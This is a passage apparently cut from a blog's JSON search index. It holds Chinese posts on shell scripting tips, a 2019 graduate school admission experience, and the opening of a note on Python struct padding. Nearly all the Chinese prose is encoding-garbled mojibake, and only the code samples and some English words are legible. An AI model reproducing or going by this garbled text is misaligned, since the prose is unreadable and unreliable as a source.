­éƒ½æœƒæœ‰ä¸€å€‹ç©ºç™½ï¼Œå¯ä»¥ä½¿ç”¨ sed å°‡å®ƒå‰”é™¤ï¼š\n\n```bash\nwc backup.sh\n# 4  9 82 backup.sh\nwc backup.sh | sed 's/^ //g'\n#4  9 82 backup.sh\n```\n\n### sort è¦†è“‹è‡ªå·±\n\nsort åƒè¬ä¸è¦ç›´æ¥é‡æ–°å°å…¥è‡ªå·±ï¼Œå¦å‰‡æœƒæ¸…é™¤è©²æª”æ¡ˆå…§å®¹ï¼š\n\n```bash\ncat a.txt\n# 1\n# 2\n# 3\nsort a.txt > a.txt\ncat a.txt\n#\n```\n\nå¦‚æœæœ‰é€™å€‹éœ€æ±‚ï¼Œå¯ä»¥åŠ ä¸Š `-o` åƒæ•¸ï¼š\n\n```bash\ncat a.txt\n# 1\n# 2\n# 3\nsort a.txt -o a.txt\ncat a.txt\n# 1\n# 2\n# 3\n```\n\n## åƒæ•¸\n\n### ç‰¹æ®Šè®Šæ•¸\n\n-   `$#` æœƒæ›¿æ›æˆåƒæ•¸æ•¸é‡\n-   `$*` æœƒæ›¿æ›æˆå…¨éƒ¨åƒæ•¸\n-   æˆ‘å€‘éƒ½çŸ¥é“ $1, $2 ç”¨ä¾†æŒ‡å®šä¸åŒåƒæ•¸ï¼Œä½†å‡å¦‚æ˜¯åƒæ•¸ 10ï¼Œ\\$10 æœƒè¢«è½‰è­¯æˆ `$1` ä»¥åŠ `0`ï¼Œé€™æ™‚å€™å°±éœ€è¦ `${n}` æ ¼å¼ä¾†æŒ‡å®šåƒæ•¸ 10ï¼Œ `${10}`ã€‚\n\n## æ±ºç­–\n\n### é€€å‡ºç‹€æ…‹\n\n-   é€€å‡ºç‹€æ…‹ç‚º 0 ä»£è¡¨æˆåŠŸï¼Œé 0 ä»£è¡¨å¤±æ•—\n-   é€™å€‹é€€å‡ºç‹€æ…‹ä¸¦ä¸æ˜¯å›å‚³å€¼ï¼ˆé€™é‚Šè·Ÿ C èªè¨€ä¸å¤ªä¸€æ¨£ï¼‰\n-   å¯ä»¥ç”¨ `$?` æŸ¥çœ‹ä¸Šä¸€å€‹æŒ‡ä»¤çš„é€€å‡ºç‹€æ…‹\n\n### test æŒ‡ä»¤\n\n-   åœ¨ if å¥ä¸­å¯ä»¥ç”¨ [] ä¾†å–ä»£ test å…©è€…ä¸¦ç„¡å·®åˆ¥ï¼š\n\n```bash\n#!/bin/bash\nif test -e a;then\n    echo \"yes\"\nfi\nif [ -e a ];then\n    echo \"yes\"\nfi\n```\n\nä¸Šè¿°å…©ç¨®å¯«æ³•æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œ[] ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ Shell ä¸­ä½¿ç”¨ï¼š\n\n```bash\n[ a = a ]\necho $?   # 0\n```\n\n-   æœ‰å€‹æŒ‡ä»¤ exit ä¹Ÿå¯ä»¥è‡ªè¡Œè¨­å®šé€€å‡ºç‹€æ…‹ï¼Œè‹¥æ²’æœ‰æŒ‡å®šï¼Œå‰‡æœƒä½¿ç”¨ä¸Šä¸€å€‹æŒ‡ä»¤çš„é€€å‡ºç‹€æ…‹ç•¶ä½œé€€å‡ºç‹€æ…‹ï¼Œå³ `exit $?`\n\n### Shell Script ä¹Ÿå¯ä»¥ debug\n\n-   -v åƒæ•¸å¯ä»¥å…ˆå°å‡º script å…§å®¹ï¼Œåœ¨åŸ·è¡Œ shell\n-   -x åƒæ•¸å¯ä»¥ debugï¼Œæœƒé€è¡ŒæŒ‡ç¤ºéç¨‹\n\n### ç©ºå‘½ä»¤ï¼š\n\nåœ¨ if ï¼ˆæˆ–æ˜¯ else, elifï¼‰ä¸­è‹¥æ²’æœ‰å…§å®¹éœ€è¦åŸ·è¡Œï¼Œéœ€è¦åŠ ä¸€å€‹ç©ºå‘½ä»¤ `ï¼š`ï¼Œå¦å‰‡æœƒå ±éŒ¯èª¤ï¼ˆé¡ä¼¼ Python ä¸­çš„ passã€‚ï¼‰ï¼š\n\n```bash\n#!/bin/bash\nif test -e a;then\n    :\nelse\n    echo \"no\"\nfi\n```\n\n### && èˆ‡ ||\n\n-   åœ¨å–®è¡ŒæŒ‡ä»¤ä¸­ä½¿ç”¨ if ä¸¦ä¸ç›´è¦ºï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ && èˆ‡ || ä¾†å¼·åŒ–æˆ‘å€‘çš„æŒ‡ä»¤\n-   A && B : ç•¶ A æŒ‡ä»¤æˆåŠŸå‰‡åŸ·è¡Œ B æŒ‡ä»¤ï¼ˆA çš„é€€å‡ºç‹€æ…‹ä¸ç‚º 0 æ™‚å‰‡ä¸åŸ·è¡Œ Bï¼‰\n-   A || B : ç•¶ A æŒ‡ä»¤åŸ·è¡Œå¤±æ•—æ™‚ï¼Œæ‰åŸ·è¡Œ B\n\nä¾‹å¦‚ï¼š\n\n```bash\ngrep -irn \"target_str\" dic.txt || echo \"Couldn't not find\"\n```\n\nåƒ…æœ‰åœ¨ grep æœªæœå°‹åˆ°å…§å®¹æ™‚ï¼Œæ‰æœƒå°å‡º Couldn't not findã€‚\n\n## è¿´åœˆ\n\n### $* èˆ‡ $@\n\næˆ‘å€‘æœ‰æ™‚å€™æœƒé€é `$*` å–å¾—å…¨éƒ¨çš„åƒæ•¸ä¸¦ä¸”ä½¿ç”¨è¿´åœˆè¿­ä»£ï¼Œä½†å¦‚æœæˆ‘å€‘çš„åƒæ•¸ä¸­æ˜¯ `a b 'c d'` ä¸‰å€‹åƒæ•¸ï¼Œæœƒå› ç‚º `$*` æ˜¯æŠŠ $1, $2, ... å–å‡ºä¾†ï¼Œæœ€å¾Œè®Šæˆ a b c d ä¸Ÿçµ¦è¿´åœˆè¿­ä»£ï¼š\n\n```bash\nfor arg in $*\ndo\n    echo $arg\ndone\n```\n\nä»¥ä¸Šçš„ç¨‹å¼ç¢¼æœƒå°å‡º\n\n```\na\nb\nc\nd\n```\n\næ­¤æ™‚æˆ‘å€‘å¯ä»¥ç”¨ `\"$@\"` ä¾†æ”¹å–„ï¼Œshell æœƒå°‡å…¶æ›¿æ›ç‚º \"$1\", \"$2\" ...\n\n```bash\nfor arg in \"$@\"\ndo\n    echo $arg\ndone\n```\n\nä»¥ä¸Šçš„ç¨‹å¼ç¢¼æœƒå°å‡ºï¼š\n\n```\na\nb\nc d\n```\n\nåˆ‡è¨˜ï¼è‹¥ \"$@\" æ²’æœ‰åŠ ä¸Šé›™å¼•è™Ÿï¼Œé‚£éº¼ $@ ä»¥åŠ \\$\\* çš„çµæœæ˜¯ä¸€æ¨£çš„ã€‚\n\n### break n\n\n-   Shell çš„ break å¯ä»¥ä¸€æ¬¡è·³å‡ºä¸æ­¢ä¸€å±¤è¿´åœˆï¼Œåœ¨ break n æŒ‡å®šå³å¯\n-   è‹¥æ²’æœ‰æŒ‡å®š n å³è·³å‡ºä¸€å±¤è¿´åœˆ\n\n### è¿´åœˆæ¬¡æ•¸çš„å¹¾ç¨®æŒ‡å®šæ–¹å¼\n\n-   \\$(seq minimum maximum)\n-   {minimum..maximum}\n-   {minimum..maximum..step}\n-   (( EXP1; EXP2; EXP3 ))\n\n## è®€å¯«è³‡æ–™\n\n### \\$\\$ è®Šæ•¸\n\n`$$` è®Šæ•¸ç”¨ä¾†é¡¯ç¤ºç•¶å‰ PIDã€‚\n\nå¯« script æ™‚å¯èƒ½æœƒç”¢ç”Ÿä¸€äº›æš«å­˜æª”ï¼Œå¦‚æœå¤§å®¶éƒ½åŒæ™‚åœ¨ç”¨é€™æ”¯ scriptï¼Œé‚£éº¼ race condition å¯èƒ½æœƒç™¼ç”Ÿã€‚è¦é¿å…çš„æ–¹å¼å°±æ˜¯è®“æ¯ä¸€æ¬¡åŸ·è¡Œæ‰€ç”¢ç”Ÿçš„æš«å­˜æª”åç¨±éƒ½ä¸ä¸€æ¨£ï¼Œé‚£éº¼ä½¿ç”¨ `$$` è®Šæ•¸å°±æœƒæ˜¯ä¸€å€‹å¥½æ–¹æ³•ã€‚\n\nç”¢ç”Ÿæš«å­˜æª”è¼ƒå¥½çš„æ–¹å¼ï¼š\n\n```bash\necho \"This is tmp file\" > /tmp/tmpfile_$$\n```\n\n## ç’°å¢ƒ\n\n### å€åŸŸè®Šæ•¸\n\nåœ¨ Shell çš„ç’°å¢ƒä¸­ï¼Œæ¯åŸ·è¡Œä¸€æ”¯ script éƒ½æœƒç”¢ç”Ÿä¸€å€‹å±¬æ–¼è©² script è‡ªå·±çš„ç©ºé–“ï¼ˆå¯ä»¥æƒ³æˆæ˜¯ç”¢ç”Ÿä¸€å€‹æ–°çš„ processï¼‰ï¼Œè©²ç©ºé–“èˆ‡å¤–ç•Œäº’ä¸å¹²æ“¾ï¼š\n\n```\nâ˜ cat s.sh\n#!/bin/bash\necho $x\nâ˜ x=100\nâ˜ ./s.sh\n\nâ˜ echo $x\n100\n```\n\n`s.sh` è…³æœ¬çœ‹ä¸åˆ°å¤–ç•Œçš„è®Šæ•¸ï¼Œå¤–ç•Œä¹Ÿçœ‹ä¸åˆ°å®ƒçš„è®Šæ•¸ã€‚\n\n### è¼¸å‡ºè®Šæ•¸\n\næ‰¿ä¸Šè¿°ï¼Œå¦‚æœæˆ‘å€‘æƒ³è¦å°‡ç›®å‰çš„è®Šæ•¸èˆ‡ `å­ Shell` å…±äº«æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ `export` æŒ‡ä»¤\n\n```\nâ˜ export x\nâ˜ ./s.sh\n100\n```\n\n-   export -p ï¼šæŸ¥çœ‹ç›®å‰ export çš„è®Šæ•¸åˆ—è¡¨\n\n### ç›®éŒ„ä»¥åŠç’°å¢ƒ\n\næœ‰äº† `å­ Shell` çš„æ¦‚å¿µå¾Œï¼Œä¸é›£ç†è§£åœ¨ script ä¸­è®Šæ›ç›®éŒ„å°æ–¼å¤–ç•Œçš„ Shell ä¾†èªªæ˜¯æ²’æœ‰å½±éŸ¿åŠ›çš„ï¼Œå› ç‚ºå½¼æ­¤ä¹‹é–“æ“æœ‰ç¨ç«‹çš„ç©ºé–“ã€‚\n\né‚£å¦‚æœæƒ³è¦å…±äº«ç’°å¢ƒï¼Œç”¨ç•¶å‰çš„ Shell å»åŸ·è¡Œ script æ™‚å‘¢ï¼Ÿ\n\n`.` æŒ‡ä»¤æä¾›äº†é€™ä»¶äº‹ï¼ˆå…¶å¯¦å°±æ˜¯ source æŒ‡ä»¤ï¼‰ã€‚\n\n```\n03:11:58 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/shell\n\n03:12:02 yiyu@afra shell â†’ cat s.sh\n#!/bin/bash\ncd ..\nï¼ˆç›®éŒ„ä¸¦æ²’æœ‰è¢«åˆ‡æ›ï¼‰\n03:14:39 yiyu@afra shell â†’ ./s.sh\n03:14:58 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/shell\nï¼ˆä½¿ç”¨ . æŒ‡ä»¤ï¼‰\n03:15:43 yiyu@afra shell â†’ . s.sh\n03:15:58 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/\nï¼ˆç›®éŒ„è¢«åˆ‡æ›äº†ï¼‰\n03:16:54 yiyu@afra tmp â†’ cd shell\n/Users/yiyu/dev/tmp/shell\nï¼ˆä½¿ç”¨ source æŒ‡ä»¤ï¼‰\n03:17:49 yiyu@afra shell â†’ source s.sh\n03:17:58 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/\nï¼ˆç›®éŒ„è¢«åˆ‡æ›äº†ï¼‰\n```\n\n### () èˆ‡ {}\n\né€™å…©ç¨®åŒ…è£¹æŒ‡ä»¤çš„æ–¹å¼å¯ä»¥è®“æŒ‡ä»¤ä¸€å€‹æ¥è‘—ä¸€å€‹åŸ·è¡Œä¸‹å»ï¼Œå·®ç•°åœ¨æ–¼å‰è€…æ˜¯åœ¨å­ shell ä¸­åŸ·è¡Œï¼Œå¾Œè€…æ˜¯åœ¨ç•¶å‰ shell ä¸­åŸ·è¡Œã€‚\n\n-   ()ï¼šç”¢ç”Ÿæ–°çš„ Shell ç’°å¢ƒä¾†åŸ·è¡Œ\n\n```\n03:27:54 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/shell\n03:27:58 yiyu@afra shell â†’ (cd ..)\n03:28:28 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/shell\n```\n\n-   {}ï¼šä½¿ç”¨ç•¶å‰ç’°å¢ƒåŸ·è¡Œã€‚åˆ‡è¨˜ï¼ŒæŒ‡ä»¤å‰å¾Œå¿…é ˆè¦ç©ºæ ¼ï¼Œæœ€å¾Œä¸€å€‹æŒ‡ä»¤å¾Œé¢å¿…é ˆè¦æœ‰åˆ†è™Ÿ\n\n```\n03:28:29 yiyu@afra shell â†’ pwd\n/Users/yiyu/dev/tmp/shell\n03:29:23 yiyu@afra shell â†’ { cd ..; pwd; }\n/Users/yiyu/dev/tmp\n```\n\n## å†è«–åƒæ•¸\n\n### å­—ä¸²æ ¼å¼\n\n```\n${#string}\n```\n\nå¯ä»¥ç”¨ä¾†è¨ˆç®—å­—ä¸²ï¼Œéå¸¸å¯¦ç”¨\n\n-   \\$0 å¯ä»¥ç”¨ä¾†é¡¯ç¤ºç•¶å‰çš„ç¨‹å¼åç¨±ï¼Œæ™‚å¸¸è¢«ç”¨ä¾†é¡¯ç¤ºç•¶å‰ Shell ç‚ºä½•\n\n### æ¨£å¼é…å°çµæ§‹\n\n```bash\nvar=hel___lo~\necho ${var#*l} # åˆªé™¤å·¦å´æœ€çŸ­é…å° # ___lo~\necho ${var##*l} # åˆªé™¤å·¦å´æœ€çŸ­é•·é…å° # o~\n\n# å¦‚æœæƒ³è¦æ”¹ç‚ºåˆªé™¤å³å´ï¼Œå°‡ # æ›¿æ›ç‚º %\npath=/Users/yy/dev\nbasename path # Unix çš„ basename æŒ‡ä»¤ã€‚è¼¸å‡ºï¼šdev\n# æˆ‘å€‘å¯ä»¥ç”¨æ¨£å¼é…å°çµæ§‹ä¾†æ”¹å¯«\necho ${path##*/} # åˆªé™¤å¾å·¦é‚Šé…å°è‡³æœ€å¾Œä¸€å€‹ / ï¼Œå³å¯ä»¥é”æˆ basename æŒ‡ä»¤ä¹‹è¼¸å‡º\n```\n\n# å¾Œè¨˜\n\nç†Ÿæ‚‰ Shell çš„ä¸€äº›çŸ¥è­˜èˆ‡æ¦‚å¿µä¹‹å¾Œï¼Œå¯« script æ™‚ä¸ä½†èƒ½ç”¨è¼ƒç‚ºå„ªé›…çš„æ–¹å¼ä¾†æ’°å¯«ï¼Œä¹Ÿèƒ½å¢åŠ  script çš„éˆæ´»åº¦ã€‚å°æ–¼ç¾åœ¨ CI/CD æµè¡Œçš„æ™‚ä»£ï¼ŒShell å¹¾ä¹æ˜¯ä¸å¯æˆ–ç¼ºçš„æŠ€è¡“ä¹‹ä¸€ã€‚é€™ç¯‡æ–‡ç« é™¤äº†æä¾›è‡ªå·±åœ¨æ—¥å¾Œå¯ä»¥å¿«é€Ÿæ–¹ä¾¿çš„æŸ¥é–±ä»¥å¤–ï¼Œä¹Ÿæä¾›æœ‰ä½¿ç”¨é Shell ä½†æ˜¯ä¸€ç›´æ²’æœ‰æ·±å…¥äº†è§£éçš„å„ä½æœ‹å‹å€‘ï¼\n","tags":["shell"]},{"title":"2019 äº¤å¤§è³‡å·¥ä¸çµ„æ¨ç”„å¿ƒå¾—","url":"/2019/11/22/","content":"\n## æœ¬æ¬¡æ¨ç”„æ¦‚æ³\n\n-   äº¤å¤§è³‡å·¥ä¸çµ„ å‚™å– 1ï¼ˆå‚™ä¸Šï¼‰\n-   äº¤å¤§è³‡å·¥æˆŠçµ„ å‚™å– 2ï¼ˆå‚™ä¸Šï¼‰\n-   æˆå¤§è³‡å·¥ä¹™çµ„ æ­£å– 2\n-   å°ç§‘è³‡ç®¡ä¸™çµ„ é€•å–\n-   å°ç§‘è³‡å·¥ å·® 0.4 åˆ†é€•å–ï¼ˆæ”¾æ£„é¢è©¦ï¼‰\n-   ä¸­å¤®è»Ÿå·¥ (æ”¾æ£„é¢è©¦)\n\n## è‡ªæˆ‘ä»‹ç´¹/èƒŒæ™¯\n\nä¸å…ä¿—ä¾†å€‹è‡ªæˆ‘ä»‹ç´¹ï¼ŒåŸå°±è®€åœ‹ç«‹æš¨å—åœ‹éš›å¤§å­¸è³‡å·¥ç³»ã€‚\n\næ ¡æ’ 47 %ã€‚åœ¨æ ¡æœŸé–“æ²’æœ‰é¡§å­¸æ¥­æˆç¸¾ï¼Œç©ºé–’æ™‚é–“éƒ½åœ¨ GitHub ä¸Šé¢ç©è€ï¼Œåšä¸€äº›ç©å…·æˆ–æ˜¯è‡ªå‹•åŒ–è‡ªå·±çš„é–‹ç™¼æµç¨‹ã€‚å¤§å­¸å››å¹´å…§æ¯”è¼ƒå€¼å¾—æåŠçš„ç¶“æ­·å¤§æ¦‚å°±æ˜¯æ‰“é CTFã€å¤šæ¬¡æ‰¾åˆ°å„å¤§å–®ä½æ¼æ´ä¸¦ä¸”å›å ±ã€ç®¡ç†éå­¸æ ¡å­¸ç”Ÿæœƒçš„ä¼ºæœå™¨ã€ç¨ç«‹é–‹ç™¼éæ ¡åœ’æŸ¥è©¢èª²ç¨‹çš„ç³»çµ±ã€‚\n\nå»å¹´è½äº†å­¸é•· JackKuo çš„å»ºè­°[1]ï¼ˆå»ºè­°æˆ‘å»å˜—è©¦ä¸çµ„ï¼‰ï¼Œæ–¼æ˜¯é–‹å§‹è‡ªè¡Œæ¶è¨­å„ç¨®æœå‹™ï¼Œåœ¨æ­¤ä¹Ÿæ„Ÿè¬å­¸é•·æ¯«ä¸çŒ¶è±«å°‡ä¸»æ©Ÿæ¬Šé™é–‹çµ¦æˆ‘ï¼Œè®“æˆ‘å…¨æ¬Šè² è²¬å­¸ç”Ÿæœƒä¸»æ©Ÿçš„ç³»çµ±ã€‚\n\nåŒæ™‚ä¹Ÿæ¥ä¸‹ LSAï¼ˆLinux System Administrationï¼‰èª²ç¨‹åŠ©æ•™ä¸€è·ï¼Œåœ¨å‚™èª²ä»¥åŠå¹«åŒå­¸è§£æ±ºå•é¡Œçš„åŒæ™‚ï¼Œè‡ªå·±çš„å¯¦åŠ›ä¹Ÿä¸æ–·ç´¯ç©ã€‚åœ¨æ­¤ä¹Ÿæ„Ÿè¬ Ubuntu Taiwan çš„è² è²¬äºº BlueT[2]ï¼Œåœ¨æˆ‘æ±‚å­¸æœŸé–“ä¸æ–·çµ¦äºˆæˆ‘æ©Ÿæœƒï¼Œä¸ç®¡æ˜¯å¯¦ç¿’æ©Ÿæœƒé‚„æ˜¯ Linux ä¸Šç›¸é—œçš„ç¶“é©—éƒ½å°æˆ‘æä¾›äº†åŒå¤§çš„å¹«åŠ©ã€‚\n\n## æ€§å‘æ¸¬é©—\n\nå› ç‚ºè‡ªå·±æ˜¯æ–°ç«¹äººï¼Œå°äº¤å¤§é‚„ç®—ç†Ÿæ‚‰ï¼Œé¢è©¦ç•¶å¤©ä¹Ÿä¸å¤ªç·Šå¼µã€‚ä¸€æ–¹é¢ä¹Ÿå¯èƒ½æ˜¯å› ç‚ºå­¸é•·å·²ç¶“å¤šæ¬¡å‘æˆ‘åˆ†äº«éå¾€å¹´ç¶“é©—ã€‚åœ¨é¢è©¦å‰ä¸€é€±æ™‚å†çœ‹ä¸€æ¬¡å»å¹´çš„è€ƒé¡Œï¼Œæœ‰ 8 æˆéƒ½èƒ½è¼•é¬†æ‡‰ä»˜ï¼Œç•¶æ™‚å¿ƒæƒ…éå¸¸å¹³æ·¡ã€‚\n\nç•¶å¤©è¡Œç¨‹ç‚ºã€Œæ—©ä¸Šé€²è¡Œæ€§å‘æ¸¬é©—ï¼Œä¸‹åˆé€²è¡Œé¢è©¦ã€ã€‚\n\næ€§å‘æ¸¬é©—å·å…±æœ‰ 18 é ï¼Œä½œç­”æ™‚é–“ 3 å°æ™‚ã€‚å…§å®¹åŒ…å« Mail, BSD, WWW, Linux, VM, Netã€‚å…§å®¹å¤šåŠæ˜¯å•ç›¸é—œçš„ç¶“é©—, trace log, åŸºæœ¬çš„è³‡å®‰ï¼Œæˆ–æ˜¯æŸç¨®æƒ…æ³æœ‰å“ªäº›è§£æ±ºæ–¹æ¡ˆï¼ŒåŸºæœ¬ä¸Šæ²’æœ‰ç¢°éç›¸é—œæœå‹™æˆ–æ˜¯æœ‰ç›¸é—œè¨­å®šç¶“é©—ç„¡æ³•å›ç­”ã€‚\n\né †å¸¶ä¸€æï¼Œæ€§å‘æ¸¬é©—ä¸åˆ—å…¥æˆç¸¾ï¼Œä½†æ˜¯æœƒè®“é¢è©¦å®˜æ›´åŠ äº†è§£ä¹‹å¾Œåˆ†çµ„æœƒæŠŠä½ åˆ†åˆ°å“ªä¸€çµ„ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ŠæŒ‘è‡ªå·±ç†Ÿæ‚‰çš„é¡Œç›®å¯«å³å¯ï¼Œæ²’æœ‰å¿…è¦ç¡¬æ˜¯æŠŠå…¨éƒ¨é¡Œç›®å¯«æ»¿ï¼Œåƒæˆ‘å°±æ˜¯æŠŠè‡ªå·±æ¥è§¸éçš„å…§å®¹éƒ½å¯«å®Œä¹‹å¾Œå°±äº¤å·äº†ã€‚\n\nç›¸ä¿¡å¤§å®¶å°è€ƒé¡Œæ¯”è¼ƒæ„Ÿèˆˆè¶£ï¼Œæ‰€ä»¥æˆ‘åœ¨è€ƒå ´èˆ‡å¹¾ä½æœ‹å‹ç¨å¾®è¨˜éŒ„äº†ä¸€ä¸‹ä¸™ä¸æˆŠä¸‰çµ„çš„è€ƒé¡Œ[3]ï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å†è«‹å–„åŠ åˆ©ç”¨ã€‚\n\n## é¢è©¦\n\né¢è©¦çš„éƒ¨åˆ†ç¸½å…±åˆ†ç‚ºä¸‰é—œï¼Œç¬¬ä¸€å¤©åªæœ‰å…©é—œï¼Œéƒ½æ˜¯ç”±ä¸çµ„çš„å­¸é•·ä»¥åŠä¸çµ„ç•¢æ¥­åœ¨æ¥­ç•Œçš„å­¸é•·é€²è¡Œé¢è©¦ï¼Œç¬¬äºŒå¤©æ‰æ˜¯æ•™æˆé€²è¡Œé¢è©¦ã€‚\n\nç¬¬ä¸€é—œæœ‰ä¸‰ä½å­¸é•·ä¸€èµ·é¢è©¦ï¼Œé¢è©¦å…§å®¹ä¸»è¦è‘—é‡åœ¨å‚™å¯©è³‡æ–™ä»¥åŠä¸Šåˆçš„æ€§å‘æ¸¬é©—ã€‚å› ç‚ºè‡ªå·±ä½œç­”é‚„ç®—æµæš¢ï¼ˆæå‰ä¸€å°æ™‚äº¤å·ï¼‰ï¼Œæ‰€ä»¥é¢è©¦è¢«å•åˆ°è€ƒå·ä¸Šç›¸é—œçš„è­°é¡Œä¹Ÿéƒ½èƒ½ä¾ƒä¾ƒè€Œè«‡ã€‚å…¶ä¸­ä¹Ÿæœ‰å•åˆ°æˆ‘æ‰“ CTF çš„ç›¸é—œç¶“é©—ï¼Œé™¤äº†åˆ†äº«æˆ‘æ“…é•·çš„é ˜åŸŸå¤–ï¼Œä¹ŸèŠäº†ä¸€ä¸‹ç›®å‰è‡ªå·±æ‰“ CTF é‡åˆ°çš„ç“¶é ¸ã€‚æ°£æ°›æ­¡æ„‰ï¼Œè¼•é¬†å›ç­”å³å¯ã€‚\n\nç¬¬äºŒé—œå‰‡æ˜¯æœ‰å¤§ç´„åä½å­¸é•·ä¸€èµ·é¢è©¦ä¸€ä½è€ƒç”Ÿï¼Œå•çš„å•é¡Œç›¸ç•¶å»£æ³›ï¼Œåƒæ˜¯å•ã€Œæ¶è¨­éæœ€å¤§çš„æœå‹™ã€ã€ã€Œæœ‰ç„¡åœ˜éšŠé–‹ç™¼ç¶“é©—ã€ã€ã€Œå¦‚ä½•é€²è¡Œå°ˆæ¡ˆç®¡ç†ã€ã€ã€Œåœ¨å¤šäººåœ˜éšŠå¦‚ä½•ç¶­æŒç¨‹å¼ç¢¼å“è³ªã€ã€ã€Œç©éçš„é›²æœå‹™ã€ç­‰ç­‰è­°é¡Œã€‚æ¯”è¼ƒæœ‰æ„æ€çš„æ˜¯ç™¼ç¾è‡³å°‘ä¸‰ä½å­¸é•·çš„ MacBook ä¸Šéƒ½è²¼äº† k8s çš„è²¼ç´™ï¼Œè©¢å•ä¹‹ä¸‹æ‰çŸ¥é“äº¤å¤§è‡ªå·±æœ‰å…©å€‹ k8s å¢é›†ã€‚\n\nè¢«å•åˆ°çš„é€™äº›å•é¡Œå¤§å¤šéƒ½æ˜¯åœ˜éšŠå°ˆæ¡ˆé–‹ç™¼çš„åŸºæœ¬åŠŸï¼Œè‡³å°‘æˆ‘åœ¨æ ¡åœ’å…§æœ‰åˆ†çµ„çš„å°ˆæ¡ˆéƒ½æœƒè¦æ±‚çµ„å“¡ç›¡é‡é”åˆ°é€™äº›è¦æ±‚ï¼Œæ‰€ä»¥å°æ–¼é€™ä¸€å¡Šç®—æ˜¯ç†Ÿæ‚‰ã€‚ä¹Ÿæœ‰å›ç­”å‡ºä¾†ï¼Œä¸è¶³çš„éƒ¨åˆ†æ˜¯è‡ªå·±çš„ç®¡ç†ç¶“é©—éƒ½æ˜¯ Linux ä¸Šçš„ç®¡ç†ç¶“é©—ï¼Œå°æ–¼ BSD æ²’æœ‰å¤ªå¤šçš„äº†è§£ï¼Œé¢è©¦å®˜æœ‰å•åˆ° BSD ç›¸é—œçš„æœå‹™ï¼Œç•¶æ™‚å›ç­”æ²’æœ‰å¾ˆé †æš¢ã€‚\n\næ¥è‘—æ˜¯ç¬¬äºŒå¤©èˆ‡æ•™æˆçš„é¢è©¦ã€‚\n\næ•™æˆçš„é¢è©¦æ°£æ°›è¼•é¬†è¨±å¤šï¼Œé™¤äº†æœ‰é–’èŠä¸€äº›æ¶è¨­ç¶“é©—ï¼Œä¹Ÿæœ‰å•ä¸€äº›é‡åˆ°é§­å®¢æ”»æ‰“ä¸»æ©Ÿçš„é˜²ç¦¦ç­–ç•¥ã€‚ä¹Ÿèˆ‡æ•™æˆäº’ç›¸äº¤æµäº†ä¸€ä¸‹ç¾åœ¨ä¸»æµçš„é˜²ç¦¦å¥—ä»¶çš„ä½¿ç”¨å¿ƒå¾—ï¼Œå…§å®¹æ²’æœ‰åƒå‰ä¸€å¤©å­¸é•·å•çš„é€™éº¼æ·±å…¥ï¼Œç¯€å¥ä¹Ÿæ…¢äº†è¨±å¤šã€‚\n\n## çµ¦å­¸å¼Ÿå¦¹çš„è©±\n\n1. åœ¨å­¸æ ¡çš„å°ˆæ¡ˆã€å°ˆé¡Œï¼Œè«‹æŒ‘é¸è‡ªå·±å–œæ­¡çš„ä¸»é¡Œï¼Œä¸¦ä¸”ç›¡å…¨åŠ›çš„å»åšã€‚\n\n2. å¤§å­¸æœŸé–“å¤šè·‘ conf å»çœ‹ä¸€ä¸‹å„é–“å­¸æ ¡çš„å¤§ç¥å€‘éƒ½åœ¨å¿™ä»€éº¼å°ˆæ¡ˆï¼ŒåŒæ™‚æ‹“å±•è‡ªå·±è¦–é‡ã€‚\n\n3. GitHub ä¸Šé¢éå¸¸å¤šå°ˆæ¡ˆå¯ä»¥è²¢ç»ï¼Œå¤šèˆ‡å…¶ä»–äººä¸€èµ·å¯«ç¨‹å¼ï¼Œå¢åŠ è‡ªå·±çš„å¯¦åŠ›ã€‚\n\n## çµèª\n\næ„Ÿè¬å¤§å­¸ç”Ÿæ´»ä¸­å¹«åŠ©éæˆ‘çš„å„ä½è€å¸«ï¼ŒåŒå­¸ç­‰äººã€‚\nç‰¹åˆ¥æ˜¯å…©ä½å­¸é•· JackKuo, TTW (CTF éšŠä¼æˆå“¡)ã€‚\n\n## åƒè€ƒ\n\n[1] å­¸é•· JackKuo çš„å¿ƒå¾—æ–‡ : https://reurl.cc/xDvNZ5\n[2] BlueT : https://studio.bluet.org/\n[3] æœ¬æ¬¡ä¸™ä¸æˆŠçµ„é¡Œç›®ä½ç½®ï¼ˆäººè‚‰è¨˜æ†¶ï¼Œè‹¥æœ‰ä¸å…¨è«‹è¦‹è«’ï¼‰ : https://hackmd.io/@splitline/BkALfYY5r\n","tags":["å€‹äºº"]},{"title":"Python struct æ¨¡çµ„çš„è¸©é›·è¨˜éŒ„","url":"/2019/11/05/","content":"\n## å‰è¨€\n\næ˜¨æ—¥åœ¨å¯« Python Socket Programming ä½œæ¥­æ™‚ï¼Œé‡åˆ°äº†ä¸€å€‹é—œæ–¼ struct æ¨¡çµ„çš„æœ‰è¶£çš„ç¾è±¡ï¼Œè¨˜éŒ„ä¸€ä¸‹ã€‚\n\n## æ­£æ–‡\n\næƒ…å¢ƒæ˜¯é€™æ¨£çš„ï¼Œæˆ‘æƒ³è¦å°‡ä¸€å€‹æ­£æ•´æ•¸ä»¥åŠä¸€å€‹é•·åº¦ 3 çš„å­—ä¸²è·Ÿä¸€å€‹æ­£æ•´æ•¸çµæ§‹åŒ–æˆ byte çš„å½¢å¼\n\nå¾ˆç›´è¦ºçš„ä½¿ç”¨äº†\n\n```python\nimport struct\nstruct.pack(\"I3sI\", 1, b'abc', 1)\n# \\x01\\x00\\x00\\x00abc\\x00\\x01\\x00\\x00\\x00\n```\n\nä½†é€™å€‹è¼¸å‡ºä¸¦ä¸ç¬¦åˆæˆ‘çš„é æœŸï¼Œ`æ­£æ•´æ•¸ 4 bytes` + `é•·åº¦ä¸‰çš„å­—ä¸² 3 bytes` + `æ­£æ•´æ•¸ 4 bytes`ï¼Œçµæœæ‡‰è©²è¦æ˜¯ `11 bytes`ã€‚ä½†æ˜¯è¼¸å‡ºå»æ˜¯ 